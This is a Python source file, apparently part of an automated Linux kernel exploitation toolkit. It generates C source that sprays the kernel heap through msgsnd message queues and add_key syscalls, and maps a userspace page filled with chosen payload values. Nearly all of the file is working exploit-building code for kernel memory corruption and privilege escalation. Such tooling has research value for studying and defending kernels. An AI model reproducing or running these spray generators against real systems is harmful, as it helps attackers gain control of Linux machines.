import pwnlib
import os


class PayloadPackerMixin:
    def pack_spray_payload(self, payload=None, method='add_key'):
        dispatcher = {'add_key': self.pack_spray_for_add_key
                      , 'msgsnd': self.pack_spray_for_msgsnd
                      }
        if payload is None:
            return
        else:
            fn = dispatcher[method]
            return fn(payload)

    def pack_spray_for_msgsnd(self, payload):
        spray_payload = self.pack_spray_buffer_payload(payload=payload)
        spray_function = '''
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>
#define SPRAY_PROCESS 16
#define STRUCT_LEN ''' + str(len(payload))+'\n'
        spray_function += '''
#define NUM_MSG 10
/* heap spray */

struct msgbuf
{
	long mtype;
	char mtext[STRUCT_LEN];
};

struct msgbuf msg={0x4141414141414141,{0}};
int msqid;

int msgsnd_spray()
{
	int i;
	unsigned long int *ptr;
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1)
	{
		perror("msgget");
		exit(1);
	}
	memcpy(msg.mtext, spray_buffer, STRUCT_LEN-1);
	for( i = 0; i < NUM_MSG; i++)
	{
		if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1)
		{
			perror("msgsnd");
			exit(1);
		}
	}
}

int msgrcv_spray()
{
	struct msgbuf msg_rcv;
	int i;
	for(i = 0; i < NUM_MSG; i++)
	{
		if (msgrcv(msqid, (void *) &msg_rcv, sizeof(msg_rcv.mtext), 0,
					MSG_NOERROR | IPC_NOWAIT) == -1)
		{
			if(errno != ENOMSG)
			{
				perror("msgrcv");
				exit(EXIT_FAILURE);
			}
		}
		else
		{
			//printf("message received: %s\\n", msg.mtext);
		}
	}
	return 0;
}

void do_fork_msgsnd_spray()
{
	int i;
	pid_t pid;

	msgsnd_spray();
	for(i = 0;i<SPRAY_PROCESS;i++)
	{
		pid = fork();
		if (pid == -1)
		{
			perror("fork");
			exit(0);
		}
		if (pid == 0)
		{
			msgsnd_spray();
			pause();
			//exit(0);
		}
	}
}'''
        content = spray_payload + spray_function
        if not os.path.isfile('heapspray_addkey.c'):
            file('heapspray_addkey.c', 'w').write(content)
        else:
            for i in range(10):
                new_name = 'heapspray_addkey_'+str(i)+'.c'
                if not os.path.isfile(new_name):
                    file(new_name, 'w').write(content)
                    break
        return content

    def pack_spray_for_add_key(self, payload):
        spray_payload = self.pack_spray_buffer_payload(payload=payload)
        spray_function = '''
#include <stdio.h>
volatile int do_spray=1;
void kmalloc_no_free(int times)
{
    int i;
    int ret;
    char buf[256];
    for(i = 0; i < times; i++){
        //sprintf(buf,"wtf%d",i);
        //memset(exploitbuf2,0x43+i,255);
        ret=syscall(__NR_add_key, "user", buf, spray_buffer, SPRAY_BUF_SIZE-0x18, -2);
        /*sizeof(struct user_key_payload)=18*/
        printf("%x\\n", ret);
    }
}
void kmalloc(int times)
{
    int i;
    int ret;
        //for(i=0;i<1024;i++)
    for(i=0;i<times;i++){
        if(do_spray){
            //syscall(__NR_add_key, "user", "wtf", exploitbuf, SPRAY_BUF_SIZE, -2);
            ret=syscall(__NR_add_key, "root", "wtf", spray_buffer, SPRAY_BUF_SIZE, -2);
        }
    }
}'''
        content = spray_payload + spray_function
        file('heapspray_addkey.c', 'w').write(content)
        return content

    def pack_spray_buffer_payload(self, payload=None):
        length_in_qword = len(payload)/8
        spray_payload = '#define SPRAY_BUF_SIZE '+str(len(payload)-1) + '\n'
        spray_payload += 'char spray_buffer[' + str(len(payload)) + '];\n'
        spray_payload += 'void spray_buffer_init(){\n'
        for i in range(length_in_qword):
            val = pwnlib.util.packing.u64(payload[8*i:8*i+8])
            if val != 0:
                offset = i*8
                new_statement = '    *(unsigned long*)(spray_buffer + '+hex(offset)+')='+hex(val)+';\n'
                spray_payload += new_statement
        spray_payload += '}\n'

        return spray_payload

    def pack_userspace_base_payload(self, userspace_base_payload=None):
        """
        mmap and init userspace base payload
        :param payload:
        :return:
        """
        code = self.mmap_userspace_base()
        code += '''
void init_userspace_base(){
    mmap_userspace_base();
'''
        length_in_qword = len(userspace_base_payload) / 8
        for i in range(length_in_qword):
            val = pwnlib.util.packing.u64(userspace_base_payload[8 * i:8 * i + 8])
            if val != 0:
                offset = i * 8
                new_statement = '    *(unsigned long*)(userspace_base + '+hex(offset)+')='+hex(val)+';\n'
                code += new_statement
        code += '}\n'
        if not os.path.isfile('userspace_base_mmap.c'):
            i = -1
            file('userspace_base_mmap.c', 'w').write(code)
        else:
            for i in range(10):
                newname = 'userspace_base_mmap_'+str(i)+'.c'
                if not os.path.isfile(newname):
                    file(newname, 'w').write(code)
                    break

        return code, i

    def mmap_userspace_base(self):
        code = ''
        code += '#define userspace_base_to_map ' + hex(self.userspace_base) + '\n'
        code += '''
void * userspace_base;
void mmap_userspace_base(){
    userspace_base = mmap((void *)userspace_base_to_map,0x1000'''
        code += ' * '+str(self.num_user_pages)+''',PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (userspace_base_to_map<0){
        perror("mmap failed");
    }
}
'''
        return code

